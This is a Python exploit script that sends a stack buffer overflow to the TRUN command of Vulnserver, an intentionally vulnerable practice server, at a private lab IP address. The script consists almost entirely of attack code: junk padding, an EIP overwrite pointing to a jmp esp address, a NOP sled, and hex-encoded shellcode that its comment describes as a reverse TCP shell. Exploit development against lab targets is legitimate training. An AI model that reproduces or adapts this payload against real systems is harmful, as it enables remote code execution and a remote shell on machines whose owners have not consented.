
import socket

ip = "192.168.56.101"       # IP of the victim machine
port = 9999                 # Vulnserver port

buff = b"TRUN /.:/"         # TRUN command for Vulnserver
buff += b"A" * 2003         # junk bytes to reach the EIP
buff += b"\x6A\xEE\x1F\x77" # jmp esp memory location (EIP overwrite)
buff += b"\x90" * 10        # NOP sled for safety

# Generated shell code for a reverse TCP connection.                                                                                                         
buff += b"\xd9\xeb\xd9\x74\x24\xf4\xbf\x70\xe6\x99\x06\x5b\x33"
buff += b"\xc9\xb1\x56\x31\x7b\x18\x03\x7b\x18\x83\xeb\x8c\x04"
buff += b"\x6c\xfa\x84\x4b\x8f\x03\x54\x2c\x19\xe6\x65\x6c\x7d"
buff += b"\x62\xd5\x5c\xf5\x26\xd9\x17\x5b\xd3\x6a\x55\x74\xd4"
buff += b"\xdb\xd0\xa2\xdb\xdc\x49\x96\x7a\x5e\x90\xcb\x5c\x5f"
buff += b"\x5b\x1e\x9c\x98\x86\xd3\xcc\x71\xcc\x46\xe1\xf6\x98"
buff += b"\x5a\x8a\x44\x0c\xdb\x6f\x1c\x2f\xca\x21\x17\x76\xcc"
buff += b"\xc0\xf4\x02\x45\xdb\x19\x2e\x1f\x50\xe9\xc4\x9e\xb0"
buff += b"\x20\x24\x0c\xfd\x8d\xd7\x4c\x39\x29\x08\x3b\x33\x4a"
buff += b"\xb5\x3c\x80\x31\x61\xc8\x13\x91\xe2\x6a\xf8\x20\x26"
buff += b"\xec\x8b\x2e\x83\x7a\xd3\x32\x12\xae\x6f\x4e\x9f\x51"
buff += b"\xa0\xc7\xdb\x75\x64\x8c\xb8\x14\x3d\x68\x6e\x28\x5d"
buff += b"\xd3\xcf\x8c\x15\xf9\x04\xbd\x77\x95\xe9\x8c\x87\x65"
buff += b"\x66\x86\xf4\x57\x29\x3c\x93\xdb\xa2\x9a\x64\x6a\xa4"
buff += b"\x1c\xba\xd4\xa5\xe2\x3b\x24\xef\x20\x6f\x74\x87\x81"
buff += b"\x10\x1f\x57\x2d\xc5\xb5\x5d\xb9\x26\xe1\x5a\x5e\xcf"
buff += b"\xf3\x9a\xa4\xdd\x7a\x7c\xf4\xb1\x2c\xd1\xb5\x61\x8c"
buff += b"\x81\x5d\x68\x03\xfd\x7e\x93\xce\x96\x15\x7c\xa6\xcf"
buff += b"\x81\xe5\xe3\x84\x30\xe9\x3e\xe1\x73\x61\xca\x15\x3d"
buff += b"\x82\xbf\x05\x2a\xf5\x3f\xd6\xab\x90\x3f\xbc\xaf\x32"
buff += b"\x68\x28\xb2\x63\x5e\xf7\x4d\x46\xdd\xf0\xb2\x17\xd7"
buff += b"\x8b\x85\x8d\x57\xe4\xe9\x41\x57\xf4\xbf\x0b\x57\x9c"
buff += b"\x67\x68\x04\xb9\x67\xa5\x39\x12\xf2\x46\x6b\xc6\x55"
buff += b"\x2f\x91\x31\x91\xf0\x6a\x14\xa1\xf7\x94\xea\x8e\x5f"
buff += b"\xfc\x14\x8f\x5f\xfc\x7e\x0f\x30\x94\x75\x20\xbf\x54"
buff += b"\x75\xeb\xe8\xfc\xfc\x7a\x5a\x9d\x01\x57\x3a\x03\x01"
buff += b"\x54\xe7\xb4\x78\x15\x18\x35\x7d\x3f\x7d\x36\x7d\x3f"
buff += b"\x83\x0b\xab\x06\xf1\x4a\x6f\x3d\x0a\xf9\xd2\x14\x81"
buff += b"\x01\x40\x66\x80"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print(s.recv(1024).decode('utf-8'))
s.send(buff)
s.close()


